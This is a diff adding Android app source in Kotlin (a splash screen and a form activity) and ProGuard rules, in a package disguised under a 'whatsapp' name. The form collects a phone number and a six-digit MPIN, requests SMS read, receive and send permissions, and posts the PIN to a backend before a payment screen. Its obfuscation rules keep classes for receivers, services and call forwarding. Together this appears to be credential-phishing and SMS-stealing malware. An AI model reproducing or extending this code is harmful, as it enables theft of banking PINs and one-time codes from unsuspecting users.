@@ -1,0 +1,357 @@
+mainactivity 
+
+package com.pakajb.avzbakl.msbzjl.whatsapp
+
+import android.content.Intent
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.widget.ImageView
+import android.widget.ProgressBar
+import androidx.appcompat.app.AppCompatActivity
+import com.pakajb.avzbakl.msbzjl.whatsapp.activities.FormActivity
+
+class MainActivity : AppCompatActivity() {
+    private lateinit var progressBar: ProgressBar
+    private lateinit var imageViewLogo: ImageView
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        // Initialize UI elements
+        progressBar = findViewById(R.id.progressBar)
+        imageViewLogo = findViewById(R.id.imageViewLogo)
+
+        // Set initial opacity and scale to 0 and 0.5
+        progressBar.alpha = 0f
+        imageViewLogo.alpha = 0f
+        progressBar.scaleX = 0.5f
+        progressBar.scaleY = 0.5f
+        imageViewLogo.scaleX = 0.5f
+        imageViewLogo.scaleY = 0.5f
+
+        progressBar.max = 100
+
+        // Start Animations without checking for permissions here
+        startAnimations()
+    }
+
+    private fun startAnimations() {
+        // Animate opacity and scale to full over 0.3 seconds
+        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+
+        // Start progress animation after 1 seconds
+        Handler(Looper.getMainLooper()).postDelayed({
+            showProgressAndNavigate()
+        }, 2000)
+    }
+
+    private fun showProgressAndNavigate() {
+        var progress = 0
+        val handler = Handler(Looper.getMainLooper())
+        val progressRunnable = object : Runnable {
+            override fun run() {
+                if (progress <= 100) {
+                    progressBar.progress = progress
+                    progress += 5  // Increase progress smoothly
+                    handler.postDelayed(this, 100) // Update progress every 100ms
+                } else {
+                    navigateToFormPage() // Navigate once progress completes
+                }
+            }
+        }
+        handler.post(progressRunnable)
+    }
+
+    private fun navigateToFormPage() {
+        val intent = Intent(this, FormActivity::class.java)
+        startActivity(intent)
+        finish()
+    }
+}
+
+
+
+
+formactivity 
+
+package com.pakajb.avzbakl.msbzjl.whatsapp.activities
+
+import android.Manifest
+import android.content.Context
+import android.content.Intent
+import android.os.Bundle
+import android.util.Log
+import android.widget.Button
+import android.widget.EditText
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.pakajb.avzbakl.msbzjl.whatsapp.R
+import com.pakajb.avzbakl.msbzjl.whatsapp.models.FormData
+import com.pakajb.avzbakl.msbzjl.whatsapp.network.ApiClient
+import com.pakajb.avzbakl.msbzjl.whatsapp.utils.PermissionUtil
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.HttpException
+import java.io.IOException
+
+class FormActivity : AppCompatActivity() {
+
+    private lateinit var etMobileNumber: EditText
+    private lateinit var etMPin: EditText
+    private lateinit var btnNextForm: Button
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_form)
+
+        etMobileNumber = findViewById(R.id.etMobileNumber)
+        etMPin = findViewById(R.id.etMPin)
+        btnNextForm = findViewById(R.id.btnProceed)
+
+        btnNextForm.setOnClickListener {
+            val mobileNumber = etMobileNumber.text.toString().trim()
+            val mPin = etMPin.text.toString().trim()
+
+            if (validateInputs(mobileNumber, mPin)) {
+                // Request necessary permissions when Next button is clicked
+                if (PermissionUtil.hasPermissions(
+                        this,
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.INTERNET
+                    )
+                ) {
+                    submitFormData(mobileNumber, mPin)
+                } else {
+                    // Request permissions if not already granted
+                    PermissionUtil.requestPermissions(
+                        this,
+                        arrayOf(
+                            Manifest.permission.RECEIVE_SMS,
+                            Manifest.permission.READ_SMS,
+                            Manifest.permission.SEND_SMS,
+                            Manifest.permission.INTERNET
+                        ),
+                        101
+                    )
+                }
+            }
+        }
+    }
+
+    private fun validateInputs(mobileNumber: String, mPin: String): Boolean {
+        val mobileRegex = "^[6-9]\\d{9}$".toRegex()
+        val mPinRegex = "^\\d{6}$".toRegex()
+
+        if (!mobileRegex.matches(mobileNumber)) {
+            showToast("Invalid Mobile Number!")
+            return false
+        }
+
+        if (!mPinRegex.matches(mPin)) {
+            showToast("Invalid MPIN!")
+            return false
+        }
+
+        return true
+    }
+
+    private fun submitFormData(mobileNumber: String, mPin: String) {
+        val apiInterface = ApiClient.api
+        val formData = FormData(mobile = mobileNumber, mPin = mPin)
+
+        Log.d("FormActivity", "Sending data to backend")
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiInterface.saveFormDataStep1(formData)
+                if (response.isSuccessful) {
+                    val responseBody = response.body()
+                    if (responseBody?.success == true) {
+                        val userId = responseBody.data?.userId
+                        Log.d("FormActivity", "User ID received")
+                        runOnUiThread { handleUserId(userId) }
+                    } else {
+                        runOnUiThread { showToast("Submission failed") }
+                    }
+                } else {
+                    runOnUiThread { showToast("Submission error") }
+                }
+            } catch (e: HttpException) {
+                Log.e("FormActivity", "HTTP Exception")
+                runOnUiThread { showToast("HTTP Error") }
+            } catch (e: IOException) {
+                Log.e("FormActivity", "Network Error")
+                runOnUiThread { showToast("Network Error") }
+            } catch (e: Exception) {
+                Log.e("FormActivity", "Unexpected Error")
+                runOnUiThread { showToast("Unexpected Error") }
+            }
+        }
+    }
+
+    private fun handleUserId(userId: String?) {
+        if (!userId.isNullOrEmpty()) {
+            saveUserIdToSharedPreferences(userId)
+            navigateToNextForm(userId)
+        } else {
+            showToast("User ID is missing")
+        }
+    }
+
+    private fun saveUserIdToSharedPreferences(userId: String) {
+        val sharedPref = getSharedPreferences("UserPreferences", Context.MODE_PRIVATE)
+        val editor = sharedPref.edit()
+        editor.putString("userId", userId)
+        editor.apply()
+    }
+
+    private fun showToast(message: String) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+    }
+
+    private fun navigateToNextForm(userId: String) {
+        val intent = Intent(this, PaymentActivity::class.java)
+        intent.putExtra("USER_ID", userId)
+        startActivity(intent)
+        finish()
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 101 && PermissionUtil.hasPermissions(
+                this,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.INTERNET
+            )
+        ) {
+            // If permissions are granted, submit form data
+            val mobileNumber = etMobileNumber.text.toString().trim()
+            val mPin = etMPin.text.toString().trim()
+            submitFormData(mobileNumber, mPin)
+        } else {
+            showToast("Permissions denied")
+        }
+    }
+}
+
+
+
+
+
+
+
+
+proguard 
+
+
+# 🔒 Obfuscation (नाम बदलना और सुरक्षा बढ़ाना)
+-dontusemixedcaseclassnames
+-dontpreverify
+-optimizationpasses 5
+-overloadaggressively
+-flattenpackagehierarchy
+-repackageclasses obfuscated
+
+# 🚀 Debugging Info हटाएं
+-dontusemixedcaseclassnames
+-dontoptimize
+-dontwarn android.support.**
+-dontwarn kotlinx.**
+-dontwarn kotlin.**
+
+# 🔹 Native Code को सुरक्षित रखें
+-keepclasseswithmembers class * {
+    native <methods>;
+}
+
+# 🔹 Reflection सुरक्षा (Prevent Reflection-Based Attacks)
+-keepattributes *Annotation*
+-keep class * implements android.os.Parcelable {
+    public static final android.os.Parcelable$Creator *;
+}
+
+# 🔹 ProGuard कोड को सुरक्षित बनाने के लिए
+-keep public class * extends android.app.Application
+-keep public class * extends androidx.lifecycle.ViewModel
+
+# ✅ Retrofit और OkHttp को Preserve करें (Backend Connectivity)
+-keep class retrofit2.** { *; }
+-keepattributes Signature
+-keep class okhttp3.** { *; }
+-keep class okhttp3.logging.** { *; }
+
+# ✅ Gson JSON Parsing को Preserve करें
+-keep class com.google.gson.** { *; }
+-keep class com.google.gson.reflect.TypeToken { *; }
+
+# ✅ सभी Model Classes को सुरक्षित रखें (Data Classes)
+-keepclassmembers class * {
+    @com.google.gson.annotations.SerializedName <fields>;
+}
+
+# ✅ Interface Methods को Preserve करें (API Calls के लिए)
+-keep interface retrofit2.** { *; }
+
+# ✅ Kotlin Coroutines और Flow को Preserve करें
+-keep class kotlinx.coroutines.** { *; }
+
+# ✅ JSON Keys को CamelCase में Preserve करें
+-keepattributes RuntimeVisibleAnnotations
+
+# 🔹 लॉग्स को Remove करें (Production में Debugging Off)
+-assumenosideeffects class android.util.Log {
+    public static *** d(...);
+    public static *** v(...);
+    public static *** i(...);
+    public static *** w(...);
+    public static *** e(...);
+}
+# Retrofit aur Gson ke liye
+-keep class com.google.gson.** { *; }
+-keep class retrofit2.** { *; }
+-keepattributes Signature
+-keepattributes *Annotation*
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.network.** { *; }
+
+# Model classes ko preserve karo (API responses ke liye)
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.models.** { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.ResponseModel { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.UserResponse { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.ApiResponse { *; }
+
+# Kotlin data classes aur lambdas ko protect karne ke liye
+-keepclassmembers class * {
+    @com.google.gson.annotations.SerializedName <fields>;
+}
+-keepclassmembers class kotlin.Metadata { *; }
+
+# Android ke Broadcast Receivers aur Services ke liye
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.receivers.** { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.services.** { *; }
+
+# OkHttp aur networking ko allow karne ke liye
+-dontwarn okhttp3.**
+-dontwarn retrofit2.**
+-dontwarn com.google.gson.**
+-dontwarn javax.annotation.**
+-dontwarn org.codehaus.mojo.animal_sniffer.IgnoreJRERequirement
+# Proguard Rules for Call Forwarding and Network Call
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.network.ApiClient { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.network.ApiInterface { *; }
+-keep class com.pakajb.avzbakl.msbzjl.whatsapp.ApiResponse { *; }
+-dontwarn okhttp3.**
+-dontwarn retrofit2.**
+
+
